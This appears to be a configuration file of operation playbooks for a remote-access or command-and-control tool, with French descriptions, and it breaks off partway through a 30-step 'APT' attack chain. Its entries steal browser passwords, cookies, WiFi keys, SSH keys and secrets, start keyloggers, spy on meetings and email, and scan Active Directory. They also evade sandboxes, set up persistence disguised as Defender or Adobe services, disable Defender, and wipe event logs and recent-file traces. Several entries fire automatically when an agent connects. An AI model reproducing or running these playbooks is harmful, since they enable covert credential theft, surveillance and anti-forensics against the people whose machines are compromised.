    # =========================================================================
    {
        "id": "op_viper",
        "name": "OP VIPER — Triage Initial 5min",
        "description": "Collecte maximale en 5 minutes top chrono. Dès qu'un agent se connecte : sysinfo complète, tous les credentials navigateur, WiFi, SSH keys, env secrets, screenshot, clipboard. Parfait pour une fenêtre d'accès courte.",
        "icon": "⚡",
        "category": "recon",
        "trigger": "on_connect",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Fingerprint",   "steps": [1, 2, 3]},
            {"label": "Phase 2 — Quick Creds",   "steps": [4, 5, 6, 7]},
            {"label": "Phase 3 — Visual Intel",  "steps": [8, 9]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis", "action": "check",          "params": {"abort_on_detected": True},                                      "delay": 0,  "timeout": 10,  "priority": "critical"},
            {"order": 2,  "module": "info",          "action": "run",             "params": {},                                                               "delay": 1,  "timeout": 20,  "priority": "critical"},
            {"order": 3,  "module": "builtin",       "action": "processes",       "params": {},                                                               "delay": 1,  "timeout": 15,  "priority": "high"},
            {"order": 4,  "module": "browser",       "action": "steal",           "params": {"browsers": ["chrome", "firefox", "edge", "brave"]},             "delay": 2,  "timeout": 60,  "priority": "critical"},
            {"order": 5,  "module": "wifi",          "action": "credentials",     "params": {},                                                               "delay": 1,  "timeout": 15,  "priority": "high"},
            {"order": 6,  "module": "builtin",       "action": "ssh_keys",        "params": {},                                                               "delay": 1,  "timeout": 10,  "priority": "high"},
            {"order": 7,  "module": "builtin",       "action": "env_secrets",     "params": {"patterns": ["TOKEN", "SECRET", "API_KEY", "PASSWORD", "AWS", "AZURE"]}, "delay": 1, "timeout": 10, "priority": "high"},
            {"order": 8,  "module": "screenshot",    "action": "capture",         "params": {"count": 3, "interval": 5},                                      "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 9,  "module": "builtin",       "action": "shell_history",   "params": {},                                                               "delay": 1,  "timeout": 10,  "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP MEDUSA — Multi-vector credential harvest (all sources)
    # Objectif : vider TOUTES les sources de credentials sur la machine.
    # =========================================================================
    {
        "id": "op_medusa",
        "name": "OP MEDUSA — Credential Harvest Total",
        "description": "Extraction exhaustive de tous les credentials disponibles : 5 navigateurs (passwords + cookies + autofill), WiFi, Credential Manager Windows, SSH keys, variables d'environnement, historique shell, fichiers .env et certificats. Keylogger 2min en fin.",
        "icon": "🐍",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Browser Sweep",    "steps": [1, 2, 3, 4]},
            {"label": "Phase 2 — OS Credentials",   "steps": [5, 6, 7, 8]},
            {"label": "Phase 3 — File Secrets",     "steps": [9, 10, 11]},
            {"label": "Phase 4 — Live Capture",     "steps": [12, 13]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis", "action": "check",              "params": {"abort_on_detected": True},                                       "delay": 0,  "timeout": 10,  "priority": "critical"},
            {"order": 2,  "module": "browser",       "action": "steal",              "params": {"browsers": ["chrome", "firefox", "edge", "brave", "opera"]},     "delay": 2,  "timeout": 90,  "priority": "critical"},
            {"order": 3,  "module": "browser",       "action": "cookies",            "params": {"browsers": ["chrome", "firefox", "edge"]},                       "delay": 3,  "timeout": 60,  "priority": "critical"},
            {"order": 4,  "module": "browser",       "action": "history",            "params": {"limit": 1000},                                                   "delay": 2,  "timeout": 60,  "priority": "normal"},
            {"order": 5,  "module": "wifi",          "action": "credentials",        "params": {},                                                               "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 6,  "module": "builtin",       "action": "credential_manager", "params": {},                                                               "delay": 2,  "timeout": 20,  "priority": "critical"},
            {"order": 7,  "module": "builtin",       "action": "ssh_keys",           "params": {},                                                               "delay": 1,  "timeout": 10,  "priority": "high"},
            {"order": 8,  "module": "builtin",       "action": "shell_history",      "params": {},                                                               "delay": 1,  "timeout": 10,  "priority": "high"},
            {"order": 9,  "module": "builtin",       "action": "env_secrets",        "params": {"patterns": ["TOKEN", "SECRET", "API_KEY", "PASSWORD", "AWS", "AZURE", "GCP", "GITHUB", "GITLAB", "SLACK", "STRIPE", "TWILIO"]}, "delay": 2, "timeout": 15, "priority": "critical"},
            {"order": 10, "module": "file",          "action": "tree",               "params": {"path": "~", "depth": 3},                                        "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 11, "module": "builtin",       "action": "recent_files",       "params": {"limit": 100},                                                   "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 12, "module": "keylog",        "action": "start",              "params": {},                                                               "delay": 3,  "timeout": 10,  "priority": "high"},
            {"order": 13, "module": "screenshot",    "action": "capture",            "params": {"count": 5, "interval": 10},                                     "delay": 5,  "timeout": 70,  "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP GHOST RECON — Full passive environment mapping
    # Objectif : cartographier la machine et le réseau sans aucun bruit.
    # =========================================================================
    {
        "id": "op_ghost_recon",
        "name": "OP GHOST RECON — Cartographie Réseau",
        "description": "Reconnaissance complète et silencieuse. Cartographie exacte de l'OS, utilisateurs, groupes, services, réseau local, ARP, routes, partages, DNS, domaine AD. Aucune modification système. Aucune persistance.",
        "icon": "🗺",
        "category": "recon",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Host Profiling",  "steps": [1, 2, 3, 4, 5, 6]},
            {"label": "Phase 2 — Network Mapping", "steps": [7, 8, 9, 10, 11]},
            {"label": "Phase 3 — AD Discovery",    "steps": [12, 13, 14, 15]},
            {"label": "Phase 4 — Visual Capture",  "steps": [16, 17]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis", "action": "check",           "params": {},                                     "delay": 0,  "timeout": 10,  "priority": "critical"},
            {"order": 2,  "module": "info",          "action": "run",             "params": {},                                     "delay": 1,  "timeout": 30,  "priority": "high"},
            {"order": 3,  "module": "builtin",       "action": "users",           "params": {},                                     "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 4,  "module": "builtin",       "action": "groups",          "params": {},                                     "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 5,  "module": "builtin",       "action": "services",        "params": {},                                     "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 6,  "module": "builtin",       "action": "startup",         "params": {},                                     "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 7,  "module": "builtin",       "action": "netinfo",         "params": {},                                     "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 8,  "module": "builtin",       "action": "netstat",         "params": {},                                     "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 9,  "module": "builtin",       "action": "arp",             "params": {},                                     "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 10, "module": "builtin",       "action": "routes",          "params": {},                                     "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 11, "module": "builtin",       "action": "shares",          "params": {},                                     "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 12, "module": "builtin",       "action": "domain_users",    "params": {},                                     "delay": 3,  "timeout": 20,  "priority": "high"},
            {"order": 13, "module": "builtin",       "action": "domain_admins",   "params": {},                                     "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 14, "module": "builtin",       "action": "domain_computers","params": {},                                     "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 15, "module": "builtin",       "action": "dns_enum",        "params": {"domain": "corp.local"},               "delay": 3,  "timeout": 30,  "priority": "normal"},
            {"order": 16, "module": "screenshot",    "action": "capture",         "params": {"count": 2, "interval": 5},            "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 17, "module": "wifi",          "action": "scan",            "params": {},                                     "delay": 2,  "timeout": 20,  "priority": "low"},
        ],
    },

    # =========================================================================
    # OP SIREN — Social engineering support (meeting spy)
    # Objectif : capturer audio/visuel d'une réunion, surveiller les applis
    # de communication (Teams, Zoom, Slack).
    # =========================================================================
    {
        "id": "op_siren",
        "name": "OP SIREN — Espionnage Réunions",
        "description": "Surveillance ciblée d'une réunion ou session de travail. Screenshots toutes les 30s pendant 1h, keylogger complet, monitoring clipboard (copier-coller de credentials en réunion), capture des emails et messages. Idéal pour capturer des informations sensibles partagées pendant des appels.",
        "icon": "🎙",
        "category": "surveillance",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Setup Surveillance",  "steps": [1, 2, 3]},
            {"label": "Phase 2 — Capture Active",      "steps": [4, 5, 6, 7]},
            {"label": "Phase 3 — Data Collection",     "steps": [8, 9, 10]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis", "action": "check",          "params": {"abort_on_detected": True},                 "delay": 0,  "timeout": 10,  "priority": "critical"},
            {"order": 2,  "module": "info",          "action": "processes",      "params": {},                                          "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 3,  "module": "builtin",       "action": "installed",      "params": {},                                          "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 4,  "module": "keylog",        "action": "start",          "params": {},                                          "delay": 3,  "timeout": 10,  "priority": "critical"},
            {"order": 5,  "module": "screenshot",    "action": "stream_start",   "params": {"interval": 30.0, "max_frames": 120, "quality": 80}, "delay": 3, "timeout": 10, "priority": "high"},
            {"order": 6,  "module": "screen_stream", "action": "frame",          "params": {"quality": 85},                             "delay": 5,  "timeout": 15,  "priority": "high"},
            {"order": 7,  "module": "builtin",       "action": "netstat",        "params": {},                                          "delay": 5,  "timeout": 20,  "priority": "low"},
            {"order": 8,  "module": "builtin",       "action": "outlook_emails", "params": {"limit": 50, "folders": ["Inbox", "Sent"]}, "delay": 10, "timeout": 60,  "priority": "normal"},
            {"order": 9,  "module": "builtin",       "action": "telegram_data",  "params": {},                                          "delay": 5,  "timeout": 20,  "priority": "normal"},
            {"order": 10, "module": "browser",       "action": "history",        "params": {"limit": 100},                              "delay": 5,  "timeout": 30,  "priority": "low"},
        ],
    },

    # =========================================================================
    # OP TSUNAMI — Mass deployment recon (all agents simultaneously)
    # Objectif : déclencher une collecte sur TOUS les agents en même temps.
    # =========================================================================
    {
        "id": "op_tsunami",
        "name": "OP TSUNAMI — Déploiement Masse",
        "description": "Collecte simultanée sur tous les agents actifs. Reconnaissance légère + credentials navigateur + SSH keys + env secrets. Conçu pour une extraction rapide sur un maximum de machines en parallèle. Trigger automatique sur nouveau groupe.",
        "icon": "🌊",
        "category": "recon",
        "trigger": "on_connect",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Fast Fingerprint", "steps": [1, 2]},
            {"label": "Phase 2 — Credential Grab",  "steps": [3, 4, 5]},
            {"label": "Phase 3 — Quick Exfil",      "steps": [6, 7]},
        ],
        "steps": [
            {"order": 1, "module": "anti_analysis", "action": "check",       "params": {"abort_on_detected": True},                                  "delay": 0, "timeout": 8,  "priority": "critical"},
            {"order": 2, "module": "info",          "action": "run",          "params": {},                                                           "delay": 1, "timeout": 20, "priority": "critical"},
            {"order": 3, "module": "browser",       "action": "steal",        "params": {"browsers": ["chrome", "firefox", "edge"]},                  "delay": 2, "timeout": 60, "priority": "critical"},
            {"order": 4, "module": "wifi",          "action": "credentials",  "params": {},                                                           "delay": 1, "timeout": 15, "priority": "high"},
            {"order": 5, "module": "builtin",       "action": "env_secrets",  "params": {"patterns": ["TOKEN", "SECRET", "API_KEY", "AWS", "AZURE"]}, "delay": 1, "timeout": 10, "priority": "high"},
            {"order": 6, "module": "screenshot",    "action": "capture",      "params": {"count": 1, "interval": 1},                                  "delay": 2, "timeout": 15, "priority": "normal"},
            {"order": 7, "module": "builtin",       "action": "ssh_keys",     "params": {},                                                           "delay": 1, "timeout": 10, "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP BLOODHOUND — Active Directory full mapping
    # Objectif : cartographier l'AD complet pour identifier les chemins
    # d'escalade de privilèges et les cibles prioritaires.
    # =========================================================================
    {
        "id": "op_bloodhound",
        "name": "OP BLOODHOUND — AD Full Map",
        "description": "Cartographie complète de l'Active Directory : utilisateurs, groupes, ordinateurs, Domain Admins, trusts, sessions actives, partages réseau, ports critiques. Identification des DC et serveurs prioritaires pour l'escalade de privilèges.",
        "icon": "🐕",
        "category": "lateral",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — AD Enumeration",   "steps": [1, 2, 3, 4, 5, 6]},
            {"label": "Phase 2 — Network Discovery", "steps": [7, 8, 9, 10]},
            {"label": "Phase 3 — Credential Targets","steps": [11, 12, 13]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis", "action": "check",           "params": {},                                                             "delay": 0,  "timeout": 10, "priority": "critical"},
            {"order": 2,  "module": "builtin",       "action": "domain_users",    "params": {},                                                             "delay": 2,  "timeout": 20, "priority": "high"},
            {"order": 3,  "module": "builtin",       "action": "domain_admins",   "params": {},                                                             "delay": 2,  "timeout": 20, "priority": "critical"},
            {"order": 4,  "module": "builtin",       "action": "domain_computers","params": {},                                                             "delay": 2,  "timeout": 20, "priority": "high"},
            {"order": 5,  "module": "builtin",       "action": "trust_domains",   "params": {},                                                             "delay": 2,  "timeout": 20, "priority": "high"},
            {"order": 6,  "module": "builtin",       "action": "sessions",        "params": {},                                                             "delay": 2,  "timeout": 20, "priority": "critical"},
            {"order": 7,  "module": "builtin",       "action": "netinfo",         "params": {},                                                             "delay": 2,  "timeout": 20, "priority": "normal"},
            {"order": 8,  "module": "builtin",       "action": "shares",          "params": {},                                                             "delay": 2,  "timeout": 20, "priority": "normal"},
            {"order": 9,  "module": "builtin",       "action": "dns_enum",        "params": {"domain": "corp.local"},                                       "delay": 3,  "timeout": 30, "priority": "normal"},
            {"order": 10, "module": "port_scan",     "action": "subnet",          "params": {"cidr": "192.168.1.0/24", "ports": [88, 389, 445, 3268, 3389, 5985], "timeout": 0.5}, "delay": 5, "timeout": 120, "priority": "normal"},
            {"order": 11, "module": "builtin",       "action": "credential_manager","params": {},                                                           "delay": 3,  "timeout": 20, "priority": "critical"},
            {"order": 12, "module": "builtin",       "action": "ssh_keys",        "params": {},                                                             "delay": 2,  "timeout": 10, "priority": "high"},
            {"order": 13, "module": "builtin",       "action": "env_secrets",     "params": {"patterns": ["TOKEN", "KERBEROS", "NTLM", "PASSWORD", "SECRET"]}, "delay": 2, "timeout": 10, "priority": "high"},
        ],
    },

    # =========================================================================
    # OP CLEANROOM — Post-operation cleanup & anti-forensics
    # Objectif : effacer toutes les traces après une opération.
    # =========================================================================
    {
        "id": "op_cleanroom",
        "name": "OP CLEANROOM — Anti-Forensics Total",
        "description": "Effacement complet des traces post-opération. Event logs Windows (Security/System/App/PowerShell/WMI), historique PowerShell et shell, prefetch, temp files, thumbnails, recent files, jump lists. Audit de ce qui reste pour confirmer le nettoyage.",
        "icon": "🧹",
        "category": "simulation",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Audit Before", "steps": [1, 2]},
            {"label": "Phase 2 — Log Wipe",     "steps": [3, 4]},
            {"label": "Phase 3 — Trace Wipe",   "steps": [5, 6]},
            {"label": "Phase 4 — Audit After",  "steps": [7, 8]},
        ],
        "steps": [
            {"order": 1, "module": "builtin",    "action": "startup",     "params": {},                                                           "delay": 0, "timeout": 15, "priority": "normal"},
            {"order": 2, "module": "builtin",    "action": "recent_files","params": {"limit": 50},                                                "delay": 2, "timeout": 15, "priority": "normal"},
            {"order": 3, "module": "builtin",    "action": "clear_logs",  "params": {"logs": ["Security", "System", "Application", "PowerShell", "Microsoft-Windows-WMI-Activity/Operational"]}, "delay": 3, "timeout": 30, "priority": "critical"},
            {"order": 4, "module": "builtin",    "action": "clear_history","params": {},                                                          "delay": 2, "timeout": 15, "priority": "critical"},
            {"order": 5, "module": "builtin",    "action": "wipe_traces", "params": {"temp": True, "prefetch": True, "thumbcache": True},         "delay": 3, "timeout": 30, "priority": "critical"},
            {"order": 6, "module": "shell",      "action": "exec",        "params": {"cmd": "del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\* 2>nul & del /f /q %LOCALAPPDATA%\\Microsoft\\Windows\\Explorer\\thumbcache_*.db 2>nul", "timeout": 15}, "delay": 3, "timeout": 20, "priority": "high"},
            {"order": 7, "module": "builtin",    "action": "startup",     "params": {},                                                           "delay": 3, "timeout": 15, "priority": "normal"},
            {"order": 8, "module": "screenshot", "action": "capture",     "params": {"count": 1, "interval": 1},                                  "delay": 2, "timeout": 10, "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP PROMETHEUS — Privilege escalation assessment
    # Objectif : identifier tous les vecteurs d'escalade de privilèges.
    # =========================================================================
    {
        "id": "op_prometheus",
        "name": "OP PROMETHEUS — Privilege Escalation",
        "description": "Identification systématique des vecteurs d'escalade de privilèges : services mal configurés, tâches planifiées vulnérables, fichiers avec permissions faibles, tokens, credentials en clair. Cartographie des chemins vers SYSTEM/root.",
        "icon": "🔥",
        "category": "lateral",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Context",         "steps": [1, 2, 3, 4]},
            {"label": "Phase 2 — Weak Configs",    "steps": [5, 6, 7, 8]},
            {"label": "Phase 3 — Token & Creds",   "steps": [9, 10, 11]},
        ],
        "steps": [
            {"order": 1,  "module": "info",          "action": "run",             "params": {},                                                     "delay": 0,  "timeout": 30, "priority": "high"},
            {"order": 2,  "module": "builtin",       "action": "users",           "params": {},                                                     "delay": 2,  "timeout": 15, "priority": "high"},
            {"order": 3,  "module": "builtin",       "action": "groups",          "params": {},                                                     "delay": 2,  "timeout": 15, "priority": "high"},
            {"order": 4,  "module": "builtin",       "action": "processes",       "params": {},                                                     "delay": 2,  "timeout": 15, "priority": "normal"},
            {"order": 5,  "module": "builtin",       "action": "services",        "params": {},                                                     "delay": 2,  "timeout": 20, "priority": "critical"},
            {"order": 6,  "module": "builtin",       "action": "startup",         "params": {},                                                     "delay": 2,  "timeout": 15, "priority": "critical"},
            {"order": 7,  "module": "shell",         "action": "exec",            "params": {"cmd": "whoami /priv", "timeout": 10},                  "delay": 2,  "timeout": 15, "priority": "critical"},
            {"order": 8,  "module": "shell",         "action": "exec",            "params": {"cmd": "schtasks /query /fo LIST /v", "timeout": 20},   "delay": 2,  "timeout": 25, "priority": "high"},
            {"order": 9,  "module": "builtin",       "action": "env_secrets",     "params": {"patterns": ["TOKEN", "PASSWORD", "SECRET", "ADMIN"]}, "delay": 2,  "timeout": 10, "priority": "critical"},
            {"order": 10, "module": "builtin",       "action": "credential_manager","params": {},                                                   "delay": 2,  "timeout": 20, "priority": "critical"},
            {"order": 11, "module": "builtin",       "action": "ssh_keys",        "params": {},                                                     "delay": 2,  "timeout": 10, "priority": "high"},
        ],
    },

    # =========================================================================
    # OP CROWBAR — Brute force readiness & password audit
    # Objectif : collecter tous les hashes/creds pour analyse offline,
    # tester la solidité des mots de passe du domaine.
    # =========================================================================
    {
        "id": "op_crowbar",
        "name": "OP CROWBAR — Password Audit",
        "description": "Audit complet des mots de passe : extraction de tous les credentials stockés (navigateurs, Credential Manager, WiFi, .env, SSH), analyse des politiques de mots de passe AD, collecte des hashes pour audit offline. Évaluation de la solidité des passwords.",
        "icon": "🔨",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Policy Audit",   "steps": [1, 2, 3]},
            {"label": "Phase 2 — Hash Collect",   "steps": [4, 5, 6, 7]},
            {"label": "Phase 3 — Plain Creds",    "steps": [8, 9, 10, 11]},
        ],
        "steps": [
            {"order": 1,  "module": "info",          "action": "run",             "params": {},                                                               "delay": 0,  "timeout": 20, "priority": "normal"},
            {"order": 2,  "module": "shell",         "action": "exec",            "params": {"cmd": "net accounts /domain", "timeout": 10},                   "delay": 2,  "timeout": 15, "priority": "high"},
            {"order": 3,  "module": "shell",         "action": "exec",            "params": {"cmd": "net accounts", "timeout": 10},                           "delay": 2,  "timeout": 15, "priority": "high"},
            {"order": 4,  "module": "builtin",       "action": "domain_users",    "params": {},                                                               "delay": 2,  "timeout": 20, "priority": "high"},
            {"order": 5,  "module": "builtin",       "action": "domain_admins",   "params": {},                                                               "delay": 2,  "timeout": 20, "priority": "critical"},
            {"order": 6,  "module": "builtin",       "action": "sessions",        "params": {},                                                               "delay": 2,  "timeout": 20, "priority": "high"},
            {"order": 7,  "module": "builtin",       "action": "credential_manager","params": {},                                                             "delay": 2,  "timeout": 20, "priority": "critical"},
            {"order": 8,  "module": "browser",       "action": "steal",           "params": {"browsers": ["chrome", "firefox", "edge", "brave", "opera"]},   "delay": 3,  "timeout": 90, "priority": "critical"},
            {"order": 9,  "module": "wifi",          "action": "credentials",     "params": {},                                                               "delay": 2,  "timeout": 20, "priority": "high"},
            {"order": 10, "module": "builtin",       "action": "env_secrets",     "params": {"patterns": ["PASSWORD", "PASS", "PWD", "SECRET", "TOKEN", "KEY"]}, "delay": 2, "timeout": 15, "priority": "critical"},
            {"order": 11, "module": "builtin",       "action": "shell_history",   "params": {},                                                               "delay": 2,  "timeout": 10, "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP ORACLE — Database & code source exfiltration
    # Objectif : vol ciblé des bases de données, schémas SQL, code source
    # et données clients/utilisateurs.
    # =========================================================================
    {
        "id": "op_oracle",
        "name": "OP ORACLE — DB & Code Source Exfil",
        "description": "Exfiltration ciblée sur les actifs à haute valeur : bases de données (SQL, SQLite, MongoDB dumps), code source (tous langages), fichiers de config avec credentials DB, schémas et migrations. Cible les développeurs et DBA.",
        "icon": "🗄",
        "category": "exfil",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — DB Discovery",   "steps": [1, 2, 3]},
            {"label": "Phase 2 — Code Source",    "steps": [4, 5, 6]},
            {"label": "Phase 3 — Config & Creds", "steps": [7, 8, 9]},
            {"label": "Phase 4 — Exfil",          "steps": [10, 11]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis", "action": "check",      "params": {},                                                                               "delay": 0,  "timeout": 10,  "priority": "critical"},
            {"order": 2,  "module": "builtin",       "action": "processes",   "params": {},                                                                               "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 3,  "module": "port_scan",     "action": "scan",        "params": {"host": "127.0.0.1", "ports": [1433, 1521, 3306, 5432, 6379, 27017, 5984, 9200], "timeout": 0.5}, "delay": 2, "timeout": 15, "priority": "high"},
            {"order": 4,  "module": "file",          "action": "tree",        "params": {"path": "~", "depth": 4},                                                        "delay": 3,  "timeout": 30,  "priority": "normal"},
            {"order": 5,  "module": "shell",         "action": "exec",        "params": {"cmd": "find ~ -name '*.sql' -o -name '*.db' -o -name '*.sqlite' -o -name '*.dump' 2>/dev/null | head -50", "timeout": 20}, "delay": 3, "timeout": 25, "priority": "critical"},
            {"order": 6,  "module": "shell",         "action": "exec",        "params": {"cmd": "find ~ -name '*.py' -o -name '*.js' -o -name '*.go' -o -name '*.java' -o -name '*.cs' 2>/dev/null | head -100", "timeout": 20}, "delay": 3, "timeout": 25, "priority": "high"},
            {"order": 7,  "module": "builtin",       "action": "env_secrets", "params": {"patterns": ["DATABASE_URL", "DB_PASSWORD", "DB_HOST", "MONGO", "REDIS", "POSTGRES", "MYSQL"]}, "delay": 2, "timeout": 10, "priority": "critical"},
            {"order": 8,  "module": "shell",         "action": "exec",        "params": {"cmd": "find ~ -name 'database.yml' -o -name 'database.json' -o -name 'settings.py' -o -name 'config.js' 2>/dev/null | head -20", "timeout": 15}, "delay": 2, "timeout": 20, "priority": "critical"},
            {"order": 9,  "module": "builtin",       "action": "shell_history","params": {},                                                                               "delay": 2,  "timeout": 10,  "priority": "normal"},
            {"order": 10, "module": "screenshot",    "action": "capture",     "params": {"count": 3, "interval": 5},                                                       "delay": 3,  "timeout": 30,  "priority": "normal"},
            {"order": 11, "module": "file",          "action": "tree",        "params": {"path": "~", "depth": 5},                                                        "delay": 5,  "timeout": 60,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP MIRAGE — Decoy / honeypot detection
    # Objectif : détecter si la machine est un honeypot ou un leurre.
    # Avant toute action offensive.
    # =========================================================================
    {
        "id": "op_mirage",
        "name": "OP MIRAGE — Détection Honeypot",
        "description": "Analyse complète pour détecter un environnement leurre (honeypot, sandbox, VM d'analyse). Vérifie : VM indicators, analyse tools, uptime court, activité utilisateur faible, réseau trop propre, noms suspects. Abort automatique si détecté.",
        "icon": "🪞",
        "category": "recon",
        "trigger": "on_connect",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — VM & Sandbox Check",  "steps": [1, 2]},
            {"label": "Phase 2 — Environment Analysis","steps": [3, 4, 5]},
            {"label": "Phase 3 — Network Validation",  "steps": [6, 7]},
        ],
        "steps": [
            {"order": 1, "module": "anti_analysis", "action": "check",      "params": {"abort_on_detected": True},                         "delay": 0, "timeout": 10, "priority": "critical"},
            {"order": 2, "module": "info",          "action": "run",         "params": {},                                                  "delay": 1, "timeout": 20, "priority": "critical"},
            {"order": 3, "module": "builtin",       "action": "processes",   "params": {},                                                  "delay": 2, "timeout": 15, "priority": "high"},
            {"order": 4, "module": "builtin",       "action": "installed",   "params": {},                                                  "delay": 2, "timeout": 20, "priority": "high"},
            {"order": 5, "module": "builtin",       "action": "users",       "params": {},                                                  "delay": 2, "timeout": 10, "priority": "high"},
            {"order": 6, "module": "builtin",       "action": "netinfo",     "params": {},                                                  "delay": 2, "timeout": 15, "priority": "normal"},
            {"order": 7, "module": "port_scan",     "action": "scan",        "params": {"host": "8.8.8.8", "ports": [53, 80, 443], "timeout": 1.0}, "delay": 3, "timeout": 15, "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP ATLAS — Full APT nation-state simulation (complete 5-phase chain)
    # Le plan d'attaque le plus complet et réaliste. 30 étapes, 5 phases.
    # =========================================================================
    {
        "id": "op_atlas",
        "name": "OP ATLAS — APT Nation-State (Full Chain)",
        "description": "La chaîne d'attaque APT la plus complète. 5 phases sur le modèle MITRE ATT&CK. Initial Access → Persistence triple → Recon AD complet → Credential harvest exhaustif → Lateral movement → Data collection → Exfil chiffrée → Cover tracks total. Durée estimée : 45-90 min.",
        "icon": "💀",
        "category": "full",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Initial Access & Assessment", "steps": [1,2,3,4,5,6]},
            {"label": "Phase 2 — Persistence & Defense Evasion","steps": [7,8,9,10,11]},
            {"label": "Phase 3 — Discovery & Lateral Prep",    "steps": [12,13,14,15,16,17]},
            {"label": "Phase 4 — Credential Access & Collection","steps": [18,19,20,21,22,23,24]},
            {"label": "Phase 5 — Exfiltration & Cover Tracks", "steps": [25,26,27,28,29,30]},
        ],
        "steps": [
            # Phase 1 — Initial Access & Assessment
            {"order": 1,  "module": "anti_analysis",  "action": "check",           "params": {"abort_on_detected": True},                                    "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "anti_analysis",  "action": "evade",           "params": {},                                                             "delay": 2,  "timeout": 20,  "priority": "critical"},
            {"order": 3,  "module": "info",           "action": "run",             "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 4,  "module": "builtin",        "action": "sysinfo",         "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 5,  "module": "builtin",        "action": "users",           "params": {},                                                             "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 6,  "module": "builtin",        "action": "processes",       "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "normal"},
            # Phase 2 — Persistence & Defense Evasion
            {"order": 7,  "module": "builtin",        "action": "persist",         "params": {"method": "registry", "key": "WindowsDefenderService"},        "delay": 3,  "timeout": 30,  "priority": "critical"},
            {"order": 8,  "module": "builtin",        "action": "persist",         "params": {"method": "scheduled_task", "name": "AdobeCloudSync", "interval": "hourly"}, "delay": 3, "timeout": 30, "priority": "critical"},
            {"order": 9,  "module": "builtin",        "action": "persist",         "params": {"method": "startup_folder"},                                    "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 10, "module": "builtin",        "action": "disable_defender","params": {},                                                             "delay": 3,  "timeout": 30,  "priority": "critical"},
            {"order": 11, "module": "builtin",        "action": "hide",            "params": {"method": "attrib_hidden"},                                     "delay": 2,  "timeout": 15,  "priority": "high"},
            # Phase 3 — Discovery & Lateral Prep
            {"order": 12, "module": "builtin",        "action": "netinfo",         "params": {},                                                             "delay": 3,  "timeout": 30,  "priority": "normal"},
            {"order": 13, "module": "builtin",        "action": "domain_users",    "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 14, "module": "builtin",        "action": "domain_admins",   "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 15, "module": "port_scan",      "action": "subnet",          "params": {"cidr": "192.168.1.0/24", "ports": [22,80,88,135,139,443,445,1433,3268,3389,5985], "timeout": 1}, "delay": 5, "timeout": 150, "priority": "normal"},
            {"order": 16, "module": "builtin",        "action": "shares",          "params": {},                                                             "delay": 3,  "timeout": 60,  "priority": "normal"},
            {"order": 17, "module": "builtin",        "action": "sessions",        "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            # Phase 4 — Credential Access & Collection
            {"order": 18, "module": "browser",        "action": "passwords",       "params": {"browsers": ["chrome","firefox","edge","brave"]},              "delay": 5,  "timeout": 90,  "priority": "critical"},
            {"order": 19, "module": "browser",        "action": "cookies",         "params": {},                                                             "delay": 3,  "timeout": 60,  "priority": "high"},
            {"order": 20, "module": "wifi",           "action": "passwords",       "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 21, "module": "builtin",        "action": "credential_manager","params": {},                                                           "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 22, "module": "builtin",        "action": "ssh_keys",        "params": {},                                                             "delay": 2,  "timeout": 20,  "priority": "high"},
